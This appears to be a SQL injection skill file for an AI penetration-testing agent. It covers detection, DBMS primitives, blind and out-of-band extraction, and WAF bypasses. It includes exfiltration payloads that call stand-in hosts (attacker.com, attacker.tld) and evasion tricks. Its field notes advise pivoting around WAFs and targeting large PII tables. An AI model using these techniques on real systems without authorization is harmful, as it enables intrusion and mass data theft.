---
name: sql-injection
description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
---

# SQL Injection

SQLi remains one of the most durable and impactful vulnerability classes. Modern exploitation focuses on parser differentials, ORM/query-builder edges, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration, and subtle blind channels. Treat every string concatenation into SQL as suspect.

## Attack Surface

**Databases**
- Classic relational: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins

**Integration Paths**
- ORMs, query builders, stored procedures
- Search servers, reporting/exporters

**Input Locations**
- Path/query/body/header/cookie
- Mixed encodings (URL, JSON, XML, multipart)
- Identifier vs value: table/column names (require quoting/escaping) vs literals (quotes/CAST requirements)
- Query builders: `whereRaw`/`orderByRaw`, string templates in ORMs
- JSON coercion or array containment operators
- Batch/bulk endpoints and report generators that embed filters directly

## Detection Channels

**Error-Based**
- Provoke type/constraint/parser errors revealing stack/version/paths

**Boolean-Based**
- Pair requests differing only in predicate truth
- Diff status/body/length/ETag

**Time-Based**
- `SLEEP`/`pg_sleep`/`WAITFOR`
- Use subselect gating to avoid global latency noise

**Out-of-Band (OAST)**
- DNS/HTTP callbacks via DB-specific primitives

## DBMS Primitives

### MySQL

- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`
- Error-based: `extractvalue()`/`updatexml()` (older), JSON functions for error shaping
- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires FILE privilege, secure_file_priv)
- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
- Time: `SLEEP(n)`, `BENCHMARK`
- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS funcs sometimes leak

### PostgreSQL

- Version/user/db: `version()`, `current_user`, `current_database()`
- Error-based: raise exception via unsupported casts or division by zero; `xpath()` errors in xml2
- OOB: `COPY (program ...)` or dblink/foreign data wrappers (when enabled); http extensions
- Time: `pg_sleep(n)`
- Files: `COPY table TO/FROM '/path'` (requires superuser), `lo_import`/`lo_export`
- JSON/JSONB: operators `->`, `->>`, `@>`, `?|` with lateral/CTE for blind extraction

### MSSQL

- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`
- OOB/DNS: `xp_dirtree`, `xp_fileexist`; HTTP via OLE automation (`sp_OACreate`) if enabled
- Exec: `xp_cmdshell` (often disabled), `OPENROWSET`/`OPENDATASOURCE`
- Time: `WAITFOR DELAY '0:0:5'`; heavy functions cause measurable delays
- Error-based: convert/parse, divide by zero, `FOR XML PATH` leaks

### Oracle

- Version/db/user: banner from `v$version`, `ora_database_name`, `user`
- OOB: `UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE` (permissions dependent)
- Time: `dbms_lock.sleep(n)`
- Error-based: `to_number`/`to_date` conversions, `XMLType`
- File: `UTL_FILE` with directory objects (privileged)

## Key Vulnerabilities

### UNION-Based Extraction

- Determine column count and types via `ORDER BY n` and `UNION SELECT null,...`
- Align types with `CAST`/`CONVERT`; coerce to text/json for rendering
- When UNION is filtered, switch to error-based or blind channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Binary search on character space for fewer requests
- Encode outputs (hex/base64) to normalize
- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### Out-of-Band

- Prefer OAST to minimize noise and bypass strict response paths
- Embed data in DNS labels or HTTP query params
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL: `LOAD_FILE` with UNC path

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login checks
- Privilege changes: update role/plan/feature flags when UPDATE is injectable
- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, `xp_cmdshell` redirection
- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow

### ORM and Query Builders

- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE/IN/ORDER clauses
- Injections via identifier quoting (table/column names) when user input is interpolated into identifiers
- JSON containment operators exposed by ORMs (e.g., `@>` in PostgreSQL) with raw fragments
- Parameter mismatch: partial parameterization where operators or lists remain unbound (`IN (...)`)

### Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with `CASE WHEN` for boolean channels
- LIMIT/OFFSET: inject into OFFSET to produce measurable timing or page shape
- Full-text/search helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with payload mixing
- XML/JSON functions: error generation via malformed documents/paths

## Bypass Techniques

**Whitespace/Spacing**
- `/**/`, `/**/!00000`, comments, newlines, tabs
- `0xe3 0x80 0x80` (ideographic space)

**Keyword Splitting**
- `UN/**/ION`, `U%4eION`, backticks/quotes, case folding

**Numeric Tricks**
- Scientific notation, signed/unsigned, hex (`0x61646d696e`)

**Encodings**
- Double URL encoding, mixed Unicode normalizations (NFKC/NFD)
- `char()`/`CONCAT_ws` to build tokens

**Clause Relocation**
- Subselects, derived tables, CTEs (`WITH`), lateral joins to hide payload shape

## Testing Methodology

1. **Identify query shape** - SELECT/INSERT/UPDATE/DELETE, presence of WHERE/ORDER/GROUP/LIMIT/OFFSET
2. **Determine input influence** - User input in identifiers vs values
3. **Confirm injection class** - Reflective errors, boolean diffs, timing, or out-of-band callbacks
4. **Choose quietest oracle** - Prefer error-based or boolean over noisy time-based
5. **Establish extraction channel** - UNION (if visible), error-based, boolean bit extraction, time-based, or OAST/DNS
6. **Pivot to metadata** - version, current user, database name
7. **Target high-value tables** - auth bypass, role changes, filesystem access if feasible

## Validation

1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates
2. Extract verifiable metadata (version, current user, database name) using the established channel
3. Retrieve or modify a non-trivial target (table rows, role flag) within legal scope
4. Provide reproducible requests that differ only in the injected fragment
5. Where applicable, demonstrate defense-in-depth bypass (WAF on, still exploitable via variant)

## False Positives

- Generic errors unrelated to SQL parsing or constraints
- Static response sizes due to templating rather than predicate truth
- Artificial delays from network/CPU unrelated to injected function calls
- Parameterized queries with no string concatenation, verified by code review

## Impact

- Direct data exfiltration and privacy/regulatory exposure
- Authentication and authorization bypass via manipulated predicates
- Server-side file access or command execution (platform/privilege dependent)
- Persistent supply-chain impact via modified data, jobs, or procedures

## Pro Tips

1. Pick the quietest reliable oracle first; avoid noisy long sleeps
2. Normalize responses (length/ETag/digest) to reduce variance when diffing
3. Aim for metadata then jump directly to business-critical tables; minimize lateral noise
4. When UNION fails, switch to error- or blind-based bit extraction; prefer OAST when available
5. Treat ORMs as thin wrappers: raw fragments often slip through; audit `whereRaw`/`orderByRaw`
6. Use CTEs/derived tables to smuggle expressions when filters block SELECT directly
7. Exploit JSON/JSONB operators in Postgres and JSON functions in MySQL for side channels
8. Keep payloads portable; maintain DBMS-specific dictionaries for functions and types
9. Validate mitigations with negative tests and code review; parameterize operators/lists correctly
10. Document exact query shapes; defenses must match how the query is constructed, not assumptions

## WAF-Bypass Field Notes (MySQL)

- When a WAF resets connections on `digit AND ...`, `UNION ALL`, `OR 'x'='x'`, `extractvalue/updatexml`, and `... FROM information_schema`, retest the SAME logic with `AND CASE WHEN (<cond>) THEN sleep(n) ELSE 0 END-- -`. `CASE WHEN` + `sleep` frequently slips past signature rules that only key on `AND <digit>`, `IF(`, `SELECT`, or `FROM`.
- If subqueries/`FROM`/`information_schema` are blocked, you can still read CURRENT-ROW data: reference the in-scope table's own columns directly (e.g. `LENGTH(NamaPolda)>=1`, `NamaPolda='ACEH'`, `ASCII(SUBSTRING(col,1,1))>n`) — no subquery or extra `FROM` needed.
- Length oracle must use `>=`: find largest n where `LENGTH(x)>=n` is true. Using `>n` off-by-one truncates the last character of every extracted string.
- WAF blocking `FROM`/`information_schema`/subqueries but not version comments: wrap the fragment in a MySQL executable comment `/*!50000 ... */` (e.g. `(select/*!50000 count(*)*/from information_schema.tables)>0`). The WAF fails to match its signature while MySQL still executes it — this re-enables cross-table/schema reads.
- Validate the oracle against known literals (`select 'root'`, `select 'ABC123'`) before trusting extracted values; unstable/false-positive oracles fabricate strings (e.g. plausible-but-wrong DB users).
- POST-only params: a GET that keeps the param value but ignores it (identical body for different values) usually means the DB query only runs on POST.
- Uniform WAF block page: an HTTP 500 whose body is BYTE-IDENTICAL across every payload (including syntactically valid tautologies like `AND '1'='1`) is a WAF block page, NOT a SQL parse error. Never cite it as SQLi evidence. Confirm by comparing response size/content-type across several payloads and a benign request.
- WAF escalation/blackhole: after N signature payloads (FortiWeb, Cloudflare, etc.) the edge may drop the client entirely — TCP/TLS reset (`curl` exit 35, HTTP 000) for minutes. Diagnose by re-fetching a BENIGN URL on the SAME host and on a DIFFERENT host: if other hosts work but the aggressed one is dead, it is a per-host/source block, not an outage. Pivot to sibling hosts lacking the WAF to keep testing.
- FortiWeb block page marker (fastest confirmation): body contains `Client IP:`, `Attack ID:`, `Message ID:` plus CSS classes `.blocked`/`.authenticate`, served with HTTP 500 and a near-constant size (observed ~39,116 bytes). Cite it as a BLOCK, never as a SQL parse error.
- **A leaked query is a PROOF channel, not an EXTRACTION channel.** Some apps echo the internal query verbatim on a syntax error (e.g. a JSON body `{"DESKRIPSI":"ERROR QUERY : select ... where KodePolda='1'' limit 1"}`). This confirms injection and reveals the query shape/param binding, but if no subquery VALUE is reflected you cannot pull data through it — do not spend time chasing a UNION on it. Keep blind time-based as the extractor and cite the echo only as evidence. The echo may fire on one malformed input while other payloads return a normal/short body; the branch that reaches the query is the one that matters.
- **Row-count / big-table discovery without `count()`.** When the WAF blocks `count(`, estimate size with `(select/*!50000 table_rows*/from information_schema.tables where table_schema='<db>' and table_name='X' limit 1)`. Run this EARLY: enumerate column names for every table, then read `table_rows` for the biggest ones. A master/registry table (millions-to-hundreds-of-millions of rows) is usually the real impact — far beyond the app's own user table. Triage by (row count × PII columns) and sample the highest-value table BEFORE spending hours on per-character dumps; a single later discovery can add a new finding and reclassify an existing one.
- **Expression-position boolean probe when predicate keywords are filtered.** If `AND`/`OR`/`CASE`/`IF` all reset/bounce, a BARE arithmetic expression in an UNQUOTED numeric parameter position still gets evaluated by MySQL and can give a clean two-state split: inject `<n> GROUP BY 1-- ` and check whether the response differs for an in-range vs out-of-range value. Ground it first (in-range like `65` → normal/valid page; out-of-range like `999` → error/empty page), then treat the split as a character oracle. It uses none of the filtered keywords. The value must NOT be quote-wrapped.
- **Assess the privilege ceiling read-only right after you gain read access.** Learn how far the account can escalate before sizing impact: `information_schema.user_privileges` (a lone `EXECUTE` = no DDL/DML/FILE), and probe `mysql.user` / `mysql.db` / `performance_schema.processlist` with `LENGTH((select/*!50000 col*/from T limit 0,1))>0` — FALSE means you cannot read other accounts/sessions, so the ceiling is capped. These probes only READ; they change nothing.
- **Stored procedure `SECURITY_TYPE=DEFINER` is the classic MySQL privesc lead — enumerate, do NOT `CALL`.** Query `information_schema.routines` for `routine_name`, `routine_type`, `security_type`, `definer`, `routine_schema` to find procedures that execute as a higher-privileged definer; a `DEFINER` proc can read/act beyond your account's own grants. Judge the path read-only via `information_schema.parameters` and `routine_definition` (or `SHOW CREATE PROCEDURE` where readable). Never execute it on a live target without explicit clearance — it can mutate data or trigger application logic.
- **A leaked username + email is NOT account takeover by itself.** When the app has a separate "validate/confirm email" or "reset" endpoint, test whether it actually demands the password: submit a real account + its leaked email + a WRONG password and confirm it rejects (many such flows re-check `username+pass`). If it also verifies the password, it is NOT an ATO path — do not report it as one. ATO from a dump then requires crackable/known plaintext or a genuine bypass.

## Summary

Modern SQLi succeeds where authorization and query construction drift from assumptions. Bind parameters everywhere, avoid dynamic identifiers, and validate at the exact boundary where user input meets SQL.
